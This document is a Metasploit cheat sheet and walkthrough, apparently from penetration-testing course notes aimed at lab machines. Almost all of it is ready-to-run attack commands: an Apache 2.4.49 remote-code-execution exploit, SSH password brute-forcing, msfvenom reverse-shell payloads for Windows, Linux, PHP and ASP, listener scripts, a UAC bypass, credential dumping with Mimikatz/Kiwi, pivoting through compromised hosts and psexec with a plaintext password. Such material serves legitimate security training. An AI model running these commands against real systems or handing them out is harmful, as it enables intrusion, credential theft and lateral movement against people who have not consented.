# The Metasploit Framework - Cheat Sheet & Walkthrough

## Table of Contents
1. [Getting Familiar with Metasploit](#1-getting-familiar-with-metasploit)
2. [Using Metasploit Payloads](#2-using-metasploit-payloads)
3. [Performing Post-Exploitation with Metasploit](#3-performing-post-exploitation-with-metasploit)
4. [Automating Metasploit](#4-automating-metasploit)
5. [Quick Reference](#5-quick-reference)

---

## 1. Getting Familiar with Metasploit

### 1.1 Database Setup

```bash
# Initialize database
sudo msfdb init

# Enable at boot
sudo systemctl enable postgresql

# Start Metasploit
sudo msfconsole

# Check database status
msf6 > db_status
```

#### Workspaces
```bash
# List workspaces
msf6 > workspace

# Create new workspace
msf6 > workspace -a pen200

# Switch workspace
msf6 > workspace pen200
```

### 1.2 Database Commands

| Command | Purpose |
|---------|---------|
| `db_nmap` | Run Nmap, save results |
| `hosts` | List discovered hosts |
| `services` | List discovered services |
| `vulns` | List discovered vulnerabilities |
| `creds` | List discovered credentials |
| `loot` | List loot |
| `notes` | List notes |
| `workspace` | Manage workspaces |

#### Filtering Services
```bash
# Filter by port
msf6 > services -p 445

# Set RHOSTS from services
msf6 > services -p 445 --rhosts
```

### 1.3 Module Basics

#### Module Categories
```
exploits   - Vulnerability exploitation
auxiliary  - Scanning, enumeration, fuzzing
payloads   - Shellcode/shells
post       - Post-exploitation
encoders   - Payload encoding
nops       - No-operation sleds
```

#### Module Commands
```bash
# Search modules
msf6 > search smb

# Search with filters
msf6 > search type:auxiliary smb
msf6 > search cve:2021-42013

# Use module
msf6 > use 0  # By index
msf6 > use exploit/multi/http/apache_normalize_path_rce

# Module info
msf6 > info

# Show options
msf6 > show options

# Set options
msf6 > set RHOSTS 192.168.50.201
msf6 > set RPORT 2222

# Unset options
msf6 > unset RHOSTS

# Show missing options
msf6 > show missing

# Run module
msf6 > run
msf6 > run -j  # Background job

# Check if vulnerable
msf6 > check
```

### 1.4 Auxiliary Modules

#### SMB Version Detection
```bash
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > set RHOSTS 192.168.50.202
msf6 > run
```

#### SSH Login Scanner
```bash
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 > set USERNAME george
msf6 > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 > set RHOSTS 192.168.50.201
msf6 > set RPORT 2222
msf6 > run
```

### 1.5 Exploit Modules

#### Apache 2.4.49 RCE
```bash
msf6 > use exploit/multi/http/apache_normalize_path_rce
msf6 > set payload linux/x64/shell_reverse_tcp
msf6 > set LHOST 192.168.119.4
msf6 > set RHOSTS 192.168.50.16
msf6 > set RPORT 80
msf6 > set SSL false
msf6 > run
```

#### Session Management
```bash
# List sessions
msf6 > sessions -l

# Interact with session
msf6 > sessions -i 2

# Background session
^Z

# Kill session
msf6 > sessions -k 2
```

---

## 2. Using Metasploit Payloads

### 2.1 Staged vs Non-Staged Payloads

| Type | Naming | Size | Stability |
|------|--------|------|-----------|
| **Staged** | `shell/reverse_tcp` | Small | First stage minimal |
| **Non-Staged** | `shell_reverse_tcp` | Larger | More stable |

**Identifier**: `/` = staged, `_` = non-staged

#### Staged Payload Example
```
payload/linux/x64/shell/reverse_tcp
                ↑
            Staged (has /)
```

#### Non-Staged Payload Example
```
payload/linux/x64/shell_reverse_tcp
                ↑
          Non-staged (has _)
```

### 2.2 Meterpreter Payloads

#### Meterpreter Features
- **In-Memory**: Runs entirely in memory
- **Encrypted**: Communication encrypted
- **Extensible**: Load extensions at runtime
- **Cross-Platform**: Windows, Linux, macOS, Android

#### Common Meterpreter Payloads

| Payload | Description |
|---------|-------------|
| `linux/x64/meterpreter_reverse_tcp` | Non-staged Linux Meterpreter |
| `linux/x64/meterpreter_reverse_https` | Non-staged HTTPS Meterpreter |
| `windows/x64/meterpreter_reverse_https` | Non-staged Windows Meterpreter |

#### Meterpreter Commands

**System Commands**:
```bash
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid
meterpreter > ps
```

**File System Commands**:
```bash
meterpreter > pwd
meterpreter > ls
meterpreter > cd
meterpreter > download /etc/passwd
meterpreter > upload /usr/bin/unix-privesc-check /tmp/
```

**Channels**:
```bash
meterpreter > shell          # Start shell channel
^Z                           # Background channel
meterpreter > channel -l     # List channels
meterpreter > channel -i 1   # Interact with channel
```

### 2.3 msfvenom

#### Basic Syntax
```bash
msfvenom -p PAYLOAD LHOST=IP LPORT=PORT -f FORMAT -o OUTPUT
```

#### Common Payloads

**Windows**:
```bash
# Non-staged reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe

# Staged reverse shell
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe

# Meterpreter HTTPS
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe
```

**Linux**:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f elf -o reverse.elf
```

**PHP**:
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f raw -o shell.php
```

**ASP**:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f asp -o shell.asp
```

#### Common Formats
```
exe    - Windows executable
elf    - Linux executable
raw    - Raw shellcode
c      - C code
ps1    - PowerShell script
vba    - VBA macro
py     - Python script
```

### 2.4 Multi/Handler

#### Setup Listener
```bash
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/shell/reverse_tcp
msf6 > set LHOST 192.168.119.2
msf6 > set LPORT 443
msf6 > run

# Background listener
msf6 > run -j
```

---

## 3. Performing Post-Exploitation with Metasploit

### 3.1 Core Meterpreter Commands

| Command | Purpose |
|---------|---------|
| `idletime` | Check user idle time |
| `getsystem` | Attempt SYSTEM elevation |
| `migrate PID` | Move to another process |
| `execute -H -f notepad` | Start hidden process |
| `getenv` | Get environment variable |

#### getuid (Elevation)
```bash
meterpreter > getuid
Server username: ITWK01\luiza

meterpreter > getsystem
...got system via technique 5

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

#### Process Migration
```bash
# List processes
meterpreter > ps

# Migrate to process
meterpreter > migrate 8052

# Create hidden process and migrate
meterpreter > execute -H -f notepad
meterpreter > migrate 2720
```

### 3.2 Post-Exploitation Modules

#### UAC Bypass
```bash
msf6 > use exploit/windows/local/bypassuac_sdclt
msf6 > set SESSION 9
msf6 > set LHOST 192.168.119.4
msf6 > run
```

#### Kiwi Extension (Mimikatz)
```bash
meterpreter > load kiwi
meterpreter > creds_msv
meterpreter > creds_all
meterpreter > wifi_list
```

### 3.3 Pivoting with Metasploit

#### Manual Route Addition
```bash
# Background session
meterpreter > bg

# Add route
msf6 > route add 172.16.5.0/24 12

# View routes
msf6 > route print

# Flush routes
msf6 > route flush
```

#### AutoRoute Module
```bash
msf6 > use multi/manage/autoroute
msf6 > set SESSION 12
msf6 > run
```

#### SOCKS Proxy
```bash
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVHOST 127.0.0.1
msf6 > set VERSION 5
msf6 > run -j
```

**Proxychains Config**:
```bash
# /etc/proxychains4.conf
socks5 127.0.0.1 1080
```

**Usage**:
```bash
proxychains xfreerdp /v:172.16.5.200 /u:luiza
```

#### Port Forwarding
```bash
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.200
meterpreter > portfwd list
meterpreter > portfwd delete -i 1
```

#### Psexec Through Pivot
```bash
msf6 > use exploit/windows/smb/psexec
msf6 > set SMBUser luiza
msf6 > set SMBPass "BoccieDearAeroMeow1!"
msf6 > set RHOSTS 172.16.5.200
msf6 > set payload windows/x64/meterpreter/bind_tcp
msf6 > set LPORT 8000
msf6 > run
```

---

## 4. Automating Metasploit

### 4.1 Resource Scripts

#### Creating Resource Script
```bash
# listener.rc
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
```

#### Running Resource Script
```bash
msfconsole -r listener.rc

# Inside Metasploit
msf6 > resource listener.rc
```

#### Provided Scripts Location
```bash
/usr/share/metasploit-framework/scripts/resource/
```

### 4.2 Global Options

```bash
# Set global option
msf6 > setg RHOSTS 192.168.50.0/24

# Unset global option
msf6 > unsetg RHOSTS
```

---

## 5. Quick Reference

### Common Workflows

#### 1. Initial Access
```bash
# Use exploit
msf6 > use exploit/multi/http/apache_normalize_path_rce
msf6 > set payload linux/x64/meterpreter_reverse_https
msf6 > set RHOSTS 192.168.50.16
msf6 > set LHOST 192.168.119.4
msf6 > run
```

#### 2. Post-Exploitation
```bash
# Elevate privileges
meterpreter > getsystem

# Migrate process
meterpreter > migrate 8052

# Load Kiwi
meterpreter > load kiwi
meterpreter > creds_msv
```

#### 3. Pivoting
```bash
# Add route
msf6 > route add 172.16.5.0/24 12

# Start SOCKS
msf6 > use auxiliary/server/socks_proxy
msf6 > run -j

# Use proxychains
proxychains nmap -sT 172.16.5.200
```

### Key Module Types

| Type | Purpose | Example |
|------|---------|---------|
| **Auxiliary** | Scanning, enumeration | `scanner/ssh/ssh_login` |
| **Exploit** | Vulnerability exploitation | `multi/http/apache_normalize_path_rce` |
| **Payload** | Shell/Meterpreter | `windows/x64/meterpreter_reverse_https` |
| **Post** | Post-exploitation | `windows/manage/migrate` |

### Key Takeaways

| Concept | Key Point |
|---------|-----------|
| **Workspaces** | Separate assessments |
| **Database** | Stores hosts, services, credentials |
| **Modules** | Auxiliary, Exploit, Payload, Post |
| **Staged** | Smaller first stage (`/`) |
| **Non-Staged** | All-in-one (`_`) |
| **Meterpreter** | Advanced multi-function payload |
| **msfvenom** | Generate executable payloads |
| **Kiwi** | Mimikatz in Meterpreter |
| **Pivoting** | Routes, SOCKS, portfwd |
| **Resource Scripts** | Automate Metasploit tasks |